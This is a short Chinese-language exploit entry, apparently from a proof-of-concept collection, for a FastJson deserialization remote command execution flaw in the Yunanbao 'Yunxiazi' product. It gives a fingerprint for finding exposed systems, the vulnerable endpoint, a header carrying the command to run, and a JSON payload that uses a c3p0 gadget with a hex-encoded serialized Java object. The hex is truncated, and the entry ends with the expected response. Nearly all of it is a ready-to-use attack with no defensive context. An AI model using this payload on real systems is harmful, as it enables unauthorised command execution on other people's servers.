# 云安宝云匣子FastJson反序列化RCE漏洞

- **系统**：云安宝云匣子FastJson　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="云安宝·云匣子"`
- **请求**：`POST /3.0/authService/config HTTP/2`
- **关键头**：`Content-Type: application/json;charset=UTF-8`　`Cmd: echo dudesuite`　`Priority: u=1, i`

**请求体 / payload**
```
{"a":{"@type":"java.lang.Class","val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"b":{"@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6…（脚本共 18907 字，完整版见原文）
```
- **预期**：200　|　dudesuite